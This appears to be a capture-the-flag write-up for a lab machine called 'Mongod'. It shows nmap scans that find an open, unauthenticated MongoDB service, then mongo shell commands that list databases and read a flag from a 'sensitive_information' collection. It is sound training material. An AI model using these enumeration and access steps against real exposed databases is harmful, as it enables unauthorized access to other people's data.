# Mongod

TARGET MACHINE IP ADDRESS
10.129.228.30

----
## Nmap 

### Initial

```
nmap -Pn 10.129.228.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 11:57 EST
Nmap scan report for 10.129.228.30
Host is up (0.049s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

### Detail

```
nmap -Pn -sS -sV -sC -O -T4 -p 22 10.129.228.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 11:57 EST
Nmap scan report for 10.129.228.30
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.93 seconds
```

### Specific Port: 27017

```
nmap -Pn -sS -sV -sC -O -T4 -p 27017 10.129.228.30 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 12:00 EST
Nmap scan report for 10.129.228.30
Host is up (0.048s latency).

PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
| mongodb-databases: 
|   totalSize = 245760.0
|   databases
|     1
|       sizeOnDisk = 73728.0
|       name = config
|       empty = false
|     0
|       sizeOnDisk = 32768.0
|       name = admin
|       empty = false
|     4
|       sizeOnDisk = 32768.0
|       name = users
|       empty = false
|     3
|       sizeOnDisk = 32768.0
|       name = sensitive_information
|       empty = false
|     2
|       sizeOnDisk = 73728.0
|       name = local
|       empty = false
|_  ok = 1.0
| mongodb-info: 
|   MongoDB Build info
|     ok = 1.0
|     openssl
|       compiled = OpenSSL 1.1.1f  31 Mar 2020
|       running = OpenSSL 1.1.1f  31 Mar 2020
|     versionArray
|       1 = 6
|       0 = 3
|       3 = 0
|       2 = 8
|     bits = 64
|     modules
|     storageEngines
|       1 = ephemeralForTest
|       0 = devnull
|       3 = wiredTiger
|       2 = mmapv1
|     maxBsonObjectSize = 16777216
|     debug = false
|     allocator = tcmalloc
|     gitVersion = 8e540c0b6db93ce994cc548f000900bdc740f80a
|     buildEnvironment
|       target_arch = x86_64
|       cc = cc: cc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
|       cxx = g++: g++ (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
|       target_os = linux

# ... and a WHOLE lot more... wow~
```

----

## Pwn: Connect to the MongoDB
- Googled a bunch of stuff for how to connect and utilize commands in MongoDB shell

```
mongo "mongodb://10.129.228.30:27017"

> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB

> use sensitive_information
switched to db sensitive_information

> show collections
flag

> db.flag.find().pretty()
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```

![Pasted image 20240221111843](https://github.com/GregKedrovsky/Hacking/assets/26492233/b1444b32-8863-4049-b75a-23fcf8a3ebf0)
